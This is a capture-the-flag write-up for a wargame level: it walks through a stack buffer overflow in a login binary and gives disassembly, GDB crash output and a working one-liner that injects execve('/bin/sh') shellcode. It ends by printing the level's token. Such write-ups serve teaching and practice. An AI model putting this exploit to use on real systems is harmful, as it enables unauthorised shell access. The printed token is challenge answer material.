# level01

1. Static analysis / Decompilation

   * The binary prompts for an admin **username** and then a **password**.
   * The username input is placed into a stack buffer of size `0x100` (256) and read from `stdin`.
   * After username handling, the program asks for a password; the subsequent handling is vulnerable and enables a classic stack **buffer overflow**.

   ### Relevant assembly excerpt (username phase)

   ```asm
   08048503  b8 df 86       MOV   EAX, s_Enter_Username_080486df    ; "Enter Username: "
   08048508  89 04 24       MOV   [ESP], EAX
   0804850b  e8 50 fe ff ff CALL  printf
   08048510  a1 20 a0 04 08 MOV   EAX, [stdin]
   08048515  89 44 24 08    MOV   [ESP+local_68], EAX
   08048519  c7 44 24 04 00 01 00 00  MOV [ESP+local_6c], 0x100
   08048521  c7 04 24 40 a0 04 08      MOV [ESP], a_user_name
   ```

   This sets up a 0x100‑byte buffer and passes it (with `stdin`) to the input routine.

   ### Decompiled / pseudo‑C (overview)

   ```c
   int main(void) {
       char username[0x100];
       puts("********* ADMIN LOGIN PROMPT *********");
       printf("Enter Username: ");
       fgets(username, 0x100, stdin);  // bounded read for username
       puts("verifying username....");
       printf("\nEnter Password: ");
       // password handling follows (vulnerable)
   }
   ```

2. Analysis of the vulnerability

   * The level contains a **stack-based buffer overflow** reachable during **password** processing. Carefully crafted input can overwrite saved stack data, including the saved return address (EIP), leading to control‑flow hijack.
   * In the original notes, a cyclic pattern causes a crash with `SIGSEGV` at an address derived from the pattern, confirming EIP control.

   #### Evidence under GDB (from notes)

   ```bash
   level01@OverRide:~$ gdb ./level01
   (gdb) r
   ********* ADMIN LOGIN PROMPT *********
   Enter Username: dat_wil
   verifying username....

   Enter Password:
   Aa0Aa1Aa2...Ad2A
   nope, incorrect password...

   Program received signal SIGSEGV, Segmentation fault.
   0x37634136 in ?? ()  # offset ~80
   ```

3. Finding the overflow offset

   * Using a cyclic pattern reveals **EIP offset ≈ 80 bytes**. After ~80 bytes of attacker‑controlled data, the next 4 bytes are interpreted as the saved return address.

4. Exploit construction

   **Strategy:**

   1. Supply a username expected by the program (e.g., `dat_wil`).
   2. Deliver shellcode with the username (stored on the stack / in process memory).
   3. On the password prompt, send a payload that overflows the vulnerable buffer, includes a **NOP sled**, and overwrites the saved return address with a pointer into the sled/shellcode region.

   **One‑liner payload components:**

   * `dat_wil` — a benign username prefix the binary recognizes.
   * Shellcode — classic x86 `execve("/bin/sh")`.
   * `\n` — terminates the username read; remaining bytes feed the password read.
   * `\x90 * 80` — NOP sled to widen the landing zone.
   * `\x47\xa0\x04\x08` — little‑endian overwrite of the saved return address (`0x0804a047`) chosen to jump into the injected region.

5. Exploitation (command used)

   ```bash
   cat <(python -c "print 'dat_wil' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\n' + ('\x90' * 80) + '\x47\xa0\x04\x08'") - | ./level01
   ```

   **What happens:**

   * Username phase ingests `dat_wil` + shellcode; password phase consumes the NOP sled and the crafted return address.
   * On function return, EIP lands in the sled and slides into the shellcode, spawning a shell.

6. Getting the token / proof

   After the shell pops, read the token (path depends on the challenge host):

   ```bash
   # in the spawned shell
   cat /home/users/level01/token
   ```

   token found `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`